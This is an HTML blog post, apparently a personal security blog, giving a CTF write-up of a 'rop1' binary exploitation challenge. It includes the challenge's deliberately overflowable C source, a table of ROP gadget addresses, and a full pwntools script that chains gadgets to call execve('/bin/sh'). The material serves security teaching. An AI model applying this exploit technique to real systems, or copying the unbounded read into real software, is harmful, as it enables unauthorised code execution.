@@ -1,0 +1,140 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='lys rop1 Writes up'><title>lys rop1 Writes up</title>
+<link rel=canonical href=https://dkri3c1.github.io/p/lys-rop1-writes-up/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property='og:title' content='lys rop1 Writes up'><meta property='og:description' content='lys rop1 Writes up'><meta property='og:url' content='https://dkri3c1.github.io/p/lys-rop1-writes-up/'><meta property='og:site_name' content="dkri3c1's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2024-08-07T00:00:00+00:00'><meta property='article:modified_time' content='2024-08-07T00:00:00+00:00'><meta property='og:image' content='https://dkri3c1.github.io/p/lys-rop1-writes-up/image.png'><meta name=twitter:title content="lys rop1 Writes up"><meta name=twitter:description content="lys rop1 Writes up"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://dkri3c1.github.io/p/lys-rop1-writes-up/image.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu13463558441656256306.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🐱</span></figure><div class=site-meta><h1 class=site-name><a href=/>dkri3c1's Blog</a></h1><h2 class=site-description>一個對於資安充滿興趣的屁孩</h2></div></header><ol class=social-menu><li><a href=https://github.com/dkri3c1 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href='https://www.instagram.com/dkri3c1?igsh=aWZnYzB1ZXJ6M3di&amp;utm_source=qr' target=_blank title=Instagram rel=me><svg viewBox="0 0 50 50" width="50" height="50"><path d="M16 3C8.8324839 3 3 8.8324839 3 16V34c0 7.167516 5.8324839 13 13 13H34c7.167516.0 13-5.832484 13-13V16C47 8.8324839 41.167516 3 34 3H16zm0 2H34c6.086484.0 11 4.9135161 11 11V34c0 6.086484-4.913516 11-11 11H16C9.9135161 45 5 40.086484 5 34V16C5 9.9135161 9.9135161 5 16 5zm21 6a2 2 0 00-2 2 2 2 0 002 2 2 2 0 002-2 2 2 0 00-2-2zM25 14c-6.063288.0-11 4.936712-11 11s4.936712 11 11 11 11-4.936712 11-11-4.936712-11-11-11zm0 2c4.982407.0 9 4.017593 9 9s-4.017593 9-9 9-9-4.017593-9-9 4.017593-9 9-9z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><!doctype html><svg height="800" width="800" id="_x32_" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="-51.2 -51.2 614.4 614.4" fill="#000"><g id="SVGRepo_bgCarrier" stroke-width="0"/><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#000" stroke-width="30.72"><style>.st0{fill:#fff}</style><g><path class="st0" d="M458.159 404.216c-18.93-33.65-49.934-71.764-100.409-93.431-28.868 20.196-63.938 32.087-101.745 32.087-37.828.0-72.898-11.89-101.767-32.087-50.474 21.667-81.479 59.782-100.398 93.431C28.731 448.848 48.417 512 91.842 512c43.426.0 164.164.0 164.164.0s120.726.0 164.153.0c43.424.0 63.11-63.152 38-107.784z"/><path class="st0" d="M256.005 300.641c74.144.0 134.231-60.108 134.231-134.242v-32.158C390.236 60.108 330.149.0 256.005.0 181.85.0 121.753 60.108 121.753 134.242V166.4C121.753 240.533 181.851 300.641 256.005 300.641z"/></g></g><g id="SVGRepo_iconCarrier"><style>.st0{fill:#fff}</style><g><path class="st0" d="M458.159 404.216c-18.93-33.65-49.934-71.764-100.409-93.431-28.868 20.196-63.938 32.087-101.745 32.087-37.828.0-72.898-11.89-101.767-32.087-50.474 21.667-81.479 59.782-100.398 93.431C28.731 448.848 48.417 512 91.842 512c43.426.0 164.164.0 164.164.0s120.726.0 164.153.0c43.424.0 63.11-63.152 38-107.784z"/><path class="st0" d="M256.005 300.641c74.144.0 134.231-60.108 134.231-134.242v-32.158C390.236 60.108 330.149.0 256.005.0 181.85.0 121.753 60.108 121.753 134.242V166.4C121.753 240.533 181.851 300.641 256.005 300.641z"/></g></g></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
+<select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://dkri3c1.github.io/ selected></option></select></li><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><ol><li><a href=#recon>Recon</a></li></ol></li><li><a href=#exploit>exploit</a><ol><li><a href=#pwned>pwned!</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/lys-rop1-writes-up/><img src=/p/lys-rop1-writes-up/image_hu12708303761680191392.png srcset="/p/lys-rop1-writes-up/image_hu12708303761680191392.png 800w, /p/lys-rop1-writes-up/image_hu15155421901195402891.png 1600w" width=800 height=443 loading=lazy alt="Featured image of post lys rop1 Writes up"></a></div><div class=article-details><header class=article-category><a href=/categories/ctf/ style=background-color:#d9006c;color:#fff>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/lys-rop1-writes-up/>lys rop1 Writes up</a></h2><h3 class=article-subtitle>lys rop1 Writes up</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Aug 07, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>2 minute read</time></div></footer></div></header><section class=article-content><h3 id=recon>Recon</h3><p>file:
+<img src=https://hackmd.io/_uploads/ByhvUZbqR.png loading=lazy alt=image></p><p>checksec:
+<img src=https://hackmd.io/_uploads/SJH9IbZcR.png loading=lazy alt=image></p><p>source.c:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>name</span><span class=p>[</span><span class=mh>0x100</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>size_t</span> <span class=nf>readbuf</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=n>i</span><span class=o>&lt;</span><span class=n>len</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>],</span><span class=mi>1</span><span class=p>)</span><span class=o>!=</span><span class=mi>1</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>==</span><span class=sc>&#39;\n&#39;</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=n>i</span><span class=o>++</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>i</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//printf(&#34;Gift: &#34;)
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;What is your name? &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>readbuf</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Hello, %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x10</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You have a buffer overflow vuln: &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>readbuf</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>我們發現在 <code>"You have a buffer overflow vuln: "</code>的 buf 大小是 10 ，但是他用 readbuf(buf,0x100) 去讀，所以導致了 buffer overflow 的問題，再來，題目本身是 statically linked ， 所以我們可以很方便的去找 gadget 來用 owob</p><h2 id=exploit>exploit</h2><p>我們的目的是要執行 execve 這個 systemcall ，所以我們要達成下面的條件</p><div class=table-wrapper><table><thead><tr><th>暫存器</th><th>值</th></tr></thead><tbody><tr><td>rax</td><td>0x3b</td></tr><tr><td>rdi</td><td>&lsquo;/bin/sh&rsquo;的位置</td></tr><tr><td>rsi</td><td>0</td></tr><tr><td>rdx</td><td>0</td></tr></tbody></table></div><p>經過一番尋找之後，我們成功湊齊了所有必要的 gadget ，但是有一個問題是 pop rdx 的gadget 不是那麼乾淨，那我們可以用 pop rdx ; pop rbx 去解決它 ， 最後一個問題是，我們該如何找到 name 也就是我們執行 &lsquo;/bin/sh&rsquo; 應該要有的位置， 其實只要用 ida 點下去那一個 function 就找到了 owob</p><p><img src=https://hackmd.io/_uploads/ByzK6ZZ90.png loading=lazy alt=image></p><div class=table-wrapper><table><thead><tr><th>暫存器</th><th>值</th></tr></thead><tbody><tr><td>rax</td><td>0x44fd87</td></tr><tr><td>rdi</td><td>0x401f4f+name_addr</td></tr><tr><td>rsi</td><td>0x409f7e</td></tr><tr><td>rdx_rbx</td><td>0x485bab</td></tr><tr><td>syscall</td><td>0x401d04</td></tr></tbody></table></div><p>exp.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import *
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>context(arch=&#34;amd64&#34;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r=process(&#39;./rop1&#39;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>p=&#39;&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>name=p64(0x4C7300)
+</span></span><span class=line><span class=cl>pop_rax=p64(0x000000000044fd87)+p64(0x3b)
+</span></span><span class=line><span class=cl>pop_rdi=p64(0x0000000000401f4f)+name
+</span></span><span class=line><span class=cl>pop_rsi=p64(0x0000000000409f7e)+p64(0x0)
+</span></span><span class=line><span class=cl>pop_rdx_pop_rbx=p64(0x0000000000485bab)+p64(0x0)+p64(0x0)
+</span></span><span class=line><span class=cl>syscall=p64(0x0000000000401d04)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>p+=pop_rax+pop_rdi+pop_rsi+pop_rdx_pop_rbx+syscall
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r.sendlineafter(&#39;?&#39;,&#39;/bin/sh&#39;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r.sendlineafter(&#39;:&#39;,&#39;a&#39;*0x18+p)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r.interactive()
+</span></span></code></pre></td></tr></table></div></div><h3 id=pwned>pwned!</h3><p><img src=https://hackmd.io/_uploads/S10V5WWqR.png loading=lazy alt=image></p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/yuawn-pwn-ret2plt-write-up/><div class=article-image><img src=/p/yuawn-pwn-ret2plt-write-up/image.25a840e797265efe23d1c0b7ff82c688_hu752172471778474594.png width=250 height=150 loading=lazy alt="Featured image of post Yuawn Pwn ret2plt Write up" data-hash="md5-JahA55cmXv4j0cC3/4LGiA=="></div><div class=article-details><h2 class=article-title>Yuawn Pwn ret2plt Write up</h2></div></a></article><article class=has-image><a href=/p/lys-rop2-writes-up/><div class=article-image><img src=/p/lys-rop2-writes-up/image.25a840e797265efe23d1c0b7ff82c688_hu752172471778474594.png width=250 height=150 loading=lazy alt="Featured image of post lys rop2 Writes up" data-hash="md5-JahA55cmXv4j0cC3/4LGiA=="></div><div class=article-details><h2 class=article-title>lys rop2 Writes up</h2></div></a></article><article class=has-image><a href=/p/pwnable-orw-yuawn-orw-writes-up/><div class=article-image><img src=/p/pwnable-orw-yuawn-orw-writes-up/image.25a840e797265efe23d1c0b7ff82c688_hu752172471778474594.png width=250 height=150 loading=lazy alt="Featured image of post pwnable orw & yuawn orw Writes up" data-hash="md5-JahA55cmXv4j0cC3/4LGiA=="></div><div class=article-details><h2 class=article-title>pwnable orw & yuawn orw Writes up</h2></div></a></article><article class=has-image><a href=/p/ais3-2024-pre-exam-writes-up/><div class=article-image><img src=/p/ais3-2024-pre-exam-writes-up/cover.a9587c1264c81d21b4a459c00c4451ba_hu16237802526414386406.png width=250 height=150 loading=lazy alt="Featured image of post AIS3 2024 Pre - Exam Writes up" data-hash="md5-qVh8EmTIHSG0pFnADERRug=="></div><div class=article-details><h2 class=article-title>AIS3 2024 Pre - Exam Writes up</h2></div></a></article><article class=has-image><a href=/p/thjcc-misc-%E9%83%A8%E5%88%86%E5%AE%98%E6%96%B9%E8%A9%B3%E8%A7%A3/><div class=article-image><img src=/p/thjcc-misc-%E9%83%A8%E5%88%86%E5%AE%98%E6%96%B9%E8%A9%B3%E8%A7%A3/cover.0acfc6238fd965ea48544b15dc3239e0_hu11106139585344856564.jpg width=250 height=150 loading=lazy alt="Featured image of post THJCC Misc 部分官方詳解" data-key="THJCC Misc 部分官方詳解" data-hash="md5-Cs/GI4/ZZepIVEsV3DI54A=="></div><div class=article-details><h2 class=article-title>THJCC Misc 部分官方詳解</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 dkri3c1's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
